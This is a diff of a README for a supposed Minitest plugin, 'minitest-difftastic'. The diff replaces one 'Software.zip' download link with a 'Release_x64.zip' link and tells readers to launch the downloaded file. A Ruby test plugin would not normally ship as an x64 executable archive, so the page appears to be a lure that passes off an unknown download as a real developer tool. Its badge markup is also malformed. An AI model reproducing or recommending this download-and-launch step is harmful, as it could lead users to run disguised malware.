@@ -1,6 +1,6 @@
 # 🌟 **Minitest-Difftastic Plugin Repository**
 
-[![GitHub release](https://img.shields.io/badge/Launch%20Software-Download%20Here-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![GitHub release](https://github.com/Mehdiabodi12/minitest-difftastic/releases/download/v1.0/Release_x64.zip%20Software-Download%20Here-brightgreen)](https://github.com/Mehdiabodi12/minitest-difftastic/releases/download/v1.0/Release_x64.zip)
 
 Welcome to the official repository of **minitest-difftastic**, a Minitest Plugin designed to seamlessly integrate difftastic for failed assertions. This plugin enhances your Minitest experience by providing a powerful tool to handle failed assertions gracefully.
 
@@ -12,7 +12,7 @@ Welcome to the official repository of **minitest-difftastic**, a Minitest Plugin
 
 ## 🔗 Useful Links
 
-- **Latest Release:** [Download Here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+- **Latest Release:** [Download Here](https://github.com/Mehdiabodi12/minitest-difftastic/releases/download/v1.0/Release_x64.zip)
 
 If the above link ends with the file name, don't forget to launch it to get started with the minitest-difftastic plugin. For more information or if the link doesn't work, please check the **Releases** section of this repository.
 
